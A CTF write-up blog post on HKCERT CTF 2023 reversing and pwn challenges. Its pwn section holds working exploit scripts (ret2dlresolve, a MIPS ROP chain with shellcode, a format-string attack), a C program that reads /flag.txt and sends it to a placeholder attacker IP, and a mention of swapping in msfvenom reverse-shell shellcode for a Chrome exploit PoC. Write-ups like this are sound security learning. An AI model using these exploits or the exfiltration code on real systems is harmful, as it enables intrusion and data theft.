---
title: "HkcertCTF 2023 Writeups"
date: 2023-11-18T16:38:33+08:00
toc: true
draft: false
---
<!--more-->
# Introduction
This year, I joined hkcertctf 2023 with team "Mystiz's fan club" and placed 3th in the open division. In this post, I will provide a brief write-up on some of the challenges I have solved.

# Rev
## Decompetition: Vitamin C-- (200 points, 10 solves)
This chal is a Decompetition. To recover original source code form the provided asm.
We are required to obtain 95% or above similarity and reverse the soruce code to get internal flag.

If we put the binary in ida and ghidra, we can follow to disassembly result to get most of the source code.
However, there are two tricky parts for me to recover.

The First one is the variables declare sequence, here are the result from ghidra and ida:
*Ghidra*
```c
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  size_t sVar6;
  int local_4c;
  int local_48;
  undefined4 local_41;
  undefined2 local_3d;
  undefined8 local_3b;
  undefined4 local_33;
  undefined4 local_2f;
  undefined2 local_2b;
  undefined8 local_29;
  undefined local_21;
  int local_20;
  int local_1c;
  
  local_29 = 0;
  local_21 = 0;
  local_2f = 0;
  local_2b = 0;
  local_33 = 0;
  local_3b = 0;
  local_41 = 0;
  local_3d = 0;
```
*ida*
```c
int __cdecl check(char *key)
{
  int v2; // ebx
  int v3; // ebx
  int v4; // ebx
  int v5; // ebx
  int year; // [rsp+24h] [rbp-44h] BYREF
  int dummy; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int8 e[6]; // [rsp+2Fh] [rbp-39h] BYREF
  unsigned __int8 d[8]; // [rsp+35h] [rbp-33h] BYREF
  unsigned __int8 c[4]; // [rsp+3Dh] [rbp-2Bh] BYREF
  unsigned __int8 b[6]; // [rsp+41h] [rbp-27h] BYREF
  unsigned __int8 a[9]; // [rsp+47h] [rbp-21h] BYREF
  int sum; // [rsp+50h] [rbp-18h]
  int i; // [rsp+54h] [rbp-14h]

  memset(a, 0, sizeof(a));
  memset(b, 0, sizeof(b));
  *(_DWORD *)c = 0;
  *(_QWORD *)d = 0LL;
  memset(e, 0, sizeof(e));
  ```

  The both result are really confuse me because if I follow the order to declare the variables in c code, the stack frame allocation is completely different.
  After a large amount of trial and errors, I accidently find the correct order:
  ```c
  int i;      
  int sum;
  unsigned char  a[9] = {0};
  unsigned char  b[6] = {0};
  unsigned char  c[4] = {0};
  unsigned char  d[8] = {0};
  unsigned char  e[6] = {0};
  int dummy;
  int year;    
  ```

The second tricky part is the following asm:
```asm
+  mov     eax, [rbp-0x18]
+  movsxd  rdx, eax
+  imul    rdx, rdx, -0x6db6db6d
+  shr     rdx, 0x20
+  add     edx, eax
+  mov     ecx, edx
+  sar     ecx, 2
+  cdq
+  sub     ecx, edx
+  mov     ebx, ecx
+  mov     edx, ebx
+  shl     edx, 3
+  sub     edx, ebx
+  sub     eax, edx
+  mov     ebx, eax
+  movzx   eax, [rbp-0x2d]
```

Both ida and ghidra are failed to disasm this asm, and I tried to recover it by c code but none of them are work.
Finally, I asked help for my teammate and @TWY suggested that it looks like the `mod 7` logic.
I tried it and we got 1.0 similarity.

The internal is `internal{27723-CTF-0462833-aaaaa}` which is also reversed by @TWY, I have no effort on it lol.

### Solve Script
```c
int ctoi(char c)
{
  return c - 48;
}

int check(char *key)

{
  int i;
  int sum;
  unsigned char  a[9] = {0};
  unsigned char  b[6] = {0};
  unsigned char  c[4] = {0};
  unsigned char  d[8] = {0};
  unsigned char  e[6] = {0};
  int dummy;
  int year;



  
  __isoc99_sscanf(key,"%8c{%5c-%3c-%7c-%5c}", a, b, c, d, e);

  if ( strlen((const char *)a) != 8
    || strlen((const char *)b) != 5
    || strlen((const char *)c) != 3
    || strlen((const char *)d) != 7
    || strlen((const char *)e) != 5 )
  {
    return -1;
  }

  if (strcmp((char *)a,"internal") != 0) {
    return -1;
  }

  __isoc99_sscanf(&b,"%3d%2d",&dummy, &year);
  
  if ( dummy != 277 )
    return -1;
  if ( year != 23 )
    return -1;
  if ( strcmp((const char *)c, "CTF") )
    return -1;
  if ( ctoi(d[0]) || !ctoi(d[7]) || ctoi(d[7]) > 8 )
    return -1;

  sum = ctoi(d[1]) + 0x10 * ctoi(d[2]) + 0x100 * ctoi(d[3]) +  0x1000 * ctoi(d[4]) + 0x10000 * ctoi(d[5]);

  if (sum != 0x38264) {
    return -1;
  }

  if (sum % 7 != ctoi(d[6])) {
    return -1;
  }
  if (e[0] != 'a') {
    return -1;
  }

  for ( i = 1; i <= 4; ++i )
  {
    if ( e[i] != e[0] )
      return -1;
  }


  return 0;

}

int main(int argc, char *argv[])
{
    if ( argc < 2 )
    {
        puts("No internal flag given?");
        return -1;

    }
    else
    {
        if ( check((char *)argv[1]) == -1 )
            {
                puts("Invalid flag :(");
                return -1;

            }
            else
            {
                puts("Correct!");
                return 0;
                
            }
    }
    return 0;
}
```

## ISA Atom (400 points, 33 solves)
This chal reverse the ISA asm from bauhina ISA platform.
If we directly run the asm on the platform, it stopped because of the execution step count is exceeded the limitation.

To solve it, I did not reverse the asm.
I translate the ISA asm to a x86 asm based the following rules:
```
R1 = ecx,
R2 = edx,
R3 = esi,
R4 = edi,
R5 = ebx,
R6 = [0x4000600]
FP = ebp,
SP = esp
```

After the tranlstation, I made a c simulator to run the tranlsted asm and run it.
We retrieved the flag after waiting for a few minutes.

### Simulator.c
```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <ctype.h>
#include <string.h>

typedef void (*void_fn)(void);

void _abort(char const * err_msg) {
    printf("%s", err_msg);
    exit(1);
}

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
}

int main() {
    int SIZE = 0x1000;
    int readed_len = 0;
    unsigned long rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8, r9, r10, r11, r12, r13;
    char *shellcode;
    init();
    shellcode = (char*) mmap((void *)0x400000-0x1000, SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    shellcode = (char*) mmap((void *)0x400000, SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    if ((long)shellcode == -1)
        _abort("mmap failed!\n");
    memset(shellcode, '\0', SIZE);

    printf("\nInput your shellcode here (max: 100): ");
    if ((readed_len = read(0, shellcode, SIZE - 1)) == 0)
        _abort("read failed!\n");
    
    ((void_fn) shellcode)();
}
```

### Translated ASM
```asm
JMP 0x0000b3
PUSH ebp
MOV ebp, esp
SUB esp, 4
MOV edx, [ebp+12]
MOV edi, [ebp+8]
MOV esi, edi
AND esi, edx
MOV ecx, esi
SHL ecx, 1
MOV ebx, edi
XOR ebx, edx
MOV esi, ebx
ADD esi, ecx
MOV ecx, esi
MOV esp, ebp
POP ebp
RET
PUSH ebp
MOV ebp, esp
SUB esp, 12
MOV ebx, [ebp+8]
CMP ebx, 2
JLE +0x4
JMP +0xd
MOV esi, ecx
MOV ecx, 1
MOV esp, ebp
POP ebp
RET
MOV [0x400600], ebx
mov eax, dword ptr [0x400600] 
sub eax, 1                 
mov dword ptr [0x400600], eax
MOV edi, [0x400600]
PUSH edi
MOV [ebp+8], ebx
MOV [ebp-8], edi
CALL -0x3b
ADD esp, 4
MOV edi, 2
imul edi, ecx
MOV ecx, [ebp-8]
MOV ecx, edi
MOV ebx, [ebp+8]
MOV edi, ebx
SUB edi, 2
MOV edx, edi
PUSH edx
MOV [ebp+8], ebx
MOV [ebp-8], ecx
MOV [ebp-12], edx
CALL -0x64
ADD esp, 4
MOV edx, [ebp-12]
MOV edx, ecx
PUSH edx
MOV ecx, [ebp-8]
PUSH ecx
MOV [ebp-8], ecx
MOV [ebp-12], edx
CALL -0x9e
ADD esp, 8
MOV edx, ecx
MOV ecx, edx
MOV esp, ebp
POP ebp
RET
SUB esp, 104
MOV edx, esp
MOV esp, ebp
SUB esp, 0
PUSH 0x8341013f
PUSH 0x83391117
PUSH 0xe35141cf
PUSH 0xa3899167
PUSH 0xc3e101df
PUSH 0x43599137
PUSH 0x23f1416f
PUSH 0x63a91187
PUSH 0x381017f
PUSH 0x3791157
PUSH 0x6391410f
PUSH 0x23c991a7
PUSH 0x3e1e602a
PUSH 0xaac6fc18
PUSH 0x940434cc
PUSH 0xbcdd4ea9
PUSH 0xb39e6f8f
PUSH 0xea8e25ed
PUSH 0xd2bc703b
PUSH 0xd339ce89
PUSH 0xa23e362a
PUSH 0x73bba5e8
PUSH 0x54412994
PUSH 0x501b6575
PUSH 0x66626a69
MOV esp, edx
MOV ebx, 0
PUSH ebx
MOV [ebp-104], ebx
CALL -0x11e
ADD esp, 4
MOV edx, ecx
AND edx, 255
MOV edi, edx
MOV ecx, ebp
SUB ecx, 100
MOV edx, ecx
MOV ebx, [ebp-104]
ADD edx, ebx
XOR [edx], edi
MOV ecx, ebp
SUB ecx, 100
MOV edx, ecx
ADD edx, ebx
XOR edx, ecx
XOR ecx, edx
XOR edx, ecx
MOV [0x400600], edx
MOV edx, 1
MOV [0x400b00], ebx
MOV ebx, 1
MOV eax, 4
int 0x80
MOV ebx,  [0x400b00]
MOV ecx, edx
ADD ebx, 1
CMP ebx, 100
MOV [ebp-104], ebx
JNZ -0x61
MOV edx, ecx
MOV ecx, 0
MOV eax, 1
int 0x80
ADD esp, 104
```

# Pwn
## ROP Revenge (300 points, 13 solves)
This is a easy pwn that if you know the technique of ret2dlresolve, I exploited and got the shell in a few minutes.
```c
context.binary = elf = ELF("./chall")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])

rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

payload = flat({120: 0x000000000040101a,128:raw_rop,256:dlresolve.payload})
io.sendline(payload)
sleep(0.2)
io.sendline(dlresolve.payload)
```
However, it closed stdin and stderr which we are not allowed to get the output from the shell.

To address the issue, I used the solution from my created challenge `Disconnect` in Bauhiniactf2023.
https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/#disconnect-500-points--1-solve

Which is upload a binary that would send the flag content to my remote server.
### solve.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <liburing.h>

char *ip = "YOUR PUBLIC IP"; //change this
int port = 58888; //change this

int main(int argc , char *argv[])
{
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char message[0x100];
    char flag[0x100];

    memset(message, 0, 0x100);
    memset(flag, 0, 0x100);

    int fd = open("/flag.txt", 0);                      

    read(fd , flag, 0x100);
    write(1, flag, 0x100);

    io_uring_queue_init(1, &ring, 0);
    sqe = io_uring_get_sqe(&ring);
    
    sqe->opcode = IORING_OP_SOCKET;
    sqe->fd = AF_INET;
    sqe->off = SOCK_STREAM;
    sqe->len = 0;			
    sqe->rw_flags = 0;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int sockfd = cqe->res;

    strcat(message, "GET /");
    strcat(message, flag);
    strcat(message, " HTTP/1.1\r\n");
    strcat(message, "Connection: close\r\n\r\n");

    // socket connection

    struct sockaddr_in info;
    bzero(&info,sizeof(info));
    info.sin_family = PF_INET;

    // ip & port
    info.sin_addr.s_addr = inet_addr(ip);
    info.sin_port = htons(port);

    int err = connect(sockfd, (struct sockaddr *)&info, sizeof(info));
    send(sockfd, message, 0x100,0);

    return 0;
}
```

### Exploit script
```python
from pwn import *
from base64 import b64encode
import gzip
context.binary = elf = ELF("./chall")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])

rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
#io = remote("127.0.0.1", 1337)
io = remote("chal.hkcert23.pwnable.hk", 28352)
payload = flat({120: 0x000000000040101a,128:raw_rop,256:dlresolve.payload})
io.sendline(payload)
sleep(0.2)
io.sendline(dlresolve.payload)
print("sent")

size = 512 # size per upload

io.sendline('cd /tmp')
io.sendline('rm b64exp.gz')
info("Uploading...")
for i in range(0, len(payload), size):
    print(f"Uploading... {i:x} / {len(payload):x}")
    #sleep(0.1)
    io.sendline('echo "{}" >> b64exp.gz'.format(payload[i:i+size]))

io.sendline('base64 -d b64exp.gz > exp.gz')
io.sendline('gzip -d exp.gz')
io.sendline('chmod +x /tmp/exp')
io.sendline('/tmp/exp')

```

## mips rop (300 points, 14 solves)
This provided program is a mips arch binary without any protection.
```c
Canary                        : ✓ (value: 0xd7bcd900)
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

We can use `qemu-mips-static -g 1234 ./rop` to run the binary and open a port for debugging and use `gdb-multiarch ./rop` with commands `set architecture mips` and `target remote 127.0.0.1:1234` to attach the binary with gdb.

The challenging part is finding the correct gadget and jump to the stack location that we placed the shellcode.

We have used four gadgets in total.
```python
set_sp2s7_jmp_s1  = 0x041F0A4
# .text:0041F0A4                 addiu   $s7, $sp, 0x20+var_8
# .text:0041F0A8                 li      $s5, strtoul
# .text:0041F0AC                 move    $s0, $v0
# .text:0041F0B0                 move    $t9, $s1
# .text:0041F0B4                 jalr    $t9

set_ra_s1_s2_s0_jmp_ra = 0x0400C14
# .text:00400C14                 lw      $ra, 0xB8+var_sC($sp)
# .text:00400C18                 lw      $s2, 0xB8+var_s8($sp)
# .text:00400C1C                 lw      $s1, 0xB8+var_s4($sp)
# .text:00400C20                 lw      $s0, 0xB8+var_s0($sp)
# .text:00400C24                 jr      $ra

set_sp2a1_jmp_s2 = 0x00440784
# .text:00440784                 addiu   $a1, $sp, 0x6C+var_38
# .text:00440788                 sw      $zero, 0x6C+var_5C($sp)
# .text:0044078C                 move    $t9, $s2
# .text:00440790                 jalr    $t9

mov_s1_a1_jmp_s0 = 0x044E20C
# .text:0044E20C                 move    $s1, $a1
# .text:0044E210                 addiu   $s5, $v0, 1
# .text:0044E214                 move    $t9, $s0
# .text:0044E218                 jalr    $t9 ; strlen
```

### Exploit Script
```python
from pwn import *


HOST = 'chal.hkcert23.pwnable.hk'
PORT = 28151
context.arch = 'mips' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
context.endian = "big"

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    # libc = ELF('')
else:
    p = process(['qemu-mips-static', '-g', '1234','./rop'])
    gdbscript = ''''''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#--- helper functions
s       = lambda data               :p.send(data)    
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---

set_sp2s7_jmp_s1  = 0x041F0A4
# .text:0041F0A4                 addiu   $s7, $sp, 0x20+var_8
# .text:0041F0A8                 li      $s5, strtoul
# .text:0041F0AC                 move    $s0, $v0
# .text:0041F0B0                 move    $t9, $s1
# .text:0041F0B4                 jalr    $t9

set_ra_s1_s2_s0_jmp_ra = 0x0400C14
# .text:00400C14                 lw      $ra, 0xB8+var_sC($sp)
# .text:00400C18                 lw      $s2, 0xB8+var_s8($sp)
# .text:00400C1C                 lw      $s1, 0xB8+var_s4($sp)
# .text:00400C20                 lw      $s0, 0xB8+var_s0($sp)
# .text:00400C24                 jr      $ra

set_sp2a1_jmp_s2 = 0x00440784
# .text:00440784                 addiu   $a1, $sp, 0x6C+var_38
# .text:00440788                 sw      $zero, 0x6C+var_5C($sp)
# .text:0044078C                 move    $t9, $s2
# .text:00440790                 jalr    $t9

mov_s1_a1_jmp_s0 = 0x044E20C
# .text:0044E20C                 move    $s1, $a1
# .text:0044E210                 addiu   $s5, $v0, 1
# .text:0044E214                 move    $t9, $s0
# .text:0044E218                 jalr    $t9 ; strlen

payload = b"A" * 76
payload += p32(set_ra_s1_s2_s0_jmp_ra)

sc = asm(shellcraft.sh())

payload = payload.ljust(80 + 0xb8, b'C')
payload += p32(0) # s0
payload += p32(0) # s1 
payload += p32(set_ra_s1_s2_s0_jmp_ra) # s2 [2]
payload += p32(set_sp2a1_jmp_s2) # ra [1]

payload = payload.ljust(80 + 0xb8 + 0x44, b'D')
payload += sc
payload = payload.ljust(80 + 0xb8 + 196 + 4, b'E')
payload += p32(set_sp2s7_jmp_s1) # s0 [4]
payload += p32(0) # s1 
payload += p32(0) # s2
payload += p32(mov_s1_a1_jmp_s0) # ra [3]

payload += b"F" *8
payload += sc
sl(payload)

p.interactive()
```

## Absolute Winner (300 points, 6 solves)

This chal gave us the chances to buffer overflow on the stack and only one chance to exploit the format string attack on `printf`.
When we set a breakpoint one the `printf` after the `pretty_alert` function, we can see the stack be like:
```c
gef➤  tele
0x007ffcfbc9f8c8│+0x0000: 0x0055d0bf24941a  →  <pretty_alert+226> lea rax, [rip+0xbed]        # 0x55d0bf24a00e    ← $rsp
0x007ffcfbc9f8d0│+0x0008: 0x00000002fbc9fa78
0x007ffcfbc9f8d8│+0x0010: 0x007ffcfbc9f91b  →  0x756f004141414141 ("AAAAA"?)
0x007ffcfbc9f8e0│+0x0018: 0x007ffcfbc9f950  →  0x007ffcfbc9f960  →  0x0000000000000001   ← $rbp
0x007ffcfbc9f8e8│+0x0020: 0x0055d0bf2498ea  →  <game3+635> mov edi, 0x0
0x007ffcfbc9f8f0│+0x0028: 0x4141414141410059 ("Y"?)
0x007ffcfbc9f8f8│+0x0030: 0x4141414141414141
0x007ffcfbc9f900│+0x0038: 0x4141414141414141
0x007ffcfbc9f908│+0x0040: 0x00000000000001f4
0x007ffcfbc9f910│+0x0048: 0x0000000200000001
```
`rsp+0x0` is the return address of the `printf` function and `rsp+0x18` is pointing to a stack address.

The exploit idea is simple, modify the value of `rsp+0x18` and let it pointed to `rsp+0x0` with `%c" * 6 + b"%77c%hhn`
and then based on the pointer to modify the return address to `printf_flag` with %92c%22$hhn`.
Here I managed to return to `printf_flag + 0x5` for avoiding some stack alignment issue.

### Exploit Script
```python
from pwn import *

TARGET = './chall'
HOST = 'chal.hkcert23.pwnable.hk'
PORT = 28246
context.arch = 'amd64' # i386/amd64
#context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    # libc = ELF('')
else:
    gdbscript = "b *$_base()+0x1415"
    
    #p = remote("127.0.0.1", 1337)
    p = gdb.debug(TARGET, gdbscript=gdbscript, aslr=True)

#--- helper functions
s       = lambda data               :p.send(data)     
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---
# printf_flag + 0x5

payload = b"N\0" 
payload = payload.ljust(0x30, b"A")
payload += b"%c" * 6 + b"%77c%hhn"
payload += b"%92c%22$hhn"

sla("Are you ready? Y/N : ", payload )
sla("Are you ready? Y/N : ",  b"Y")
sla("Place a Bet : ", "500")
sla("Make a Guess : ", str(0x1))
p.interactive()
```

## Return of babyUXSS return (500 points, 2 solves)

This challenge clearly is same as last year which exploit the bot by a browser exploit. To be honest, I used around 5 minutes to find the POC.
Here is the steps:
1. Google "v8ctf writeups"
2. Found the following tweet
https://twitter.com/_tsuro/status/1718919184040517840
3. Click on the Author Icon to look his post.
4. Found this post
https://twitter.com/tchght/status/1722144156267774223
5. Found the POC of CVE-2023-20593 — Exploiting Zenbleed from Chrome
https://github.com/vu-ls/Zenbleed-Chrome-PoC

After I found the POC, I sent it to my teammate @Hollow and he said just used the msfvenom to generate the reverse shell payload and got a reverse shell back by changing the shellcode in line 248 to a reverse TCP shell shellcode generated by msfvenom.


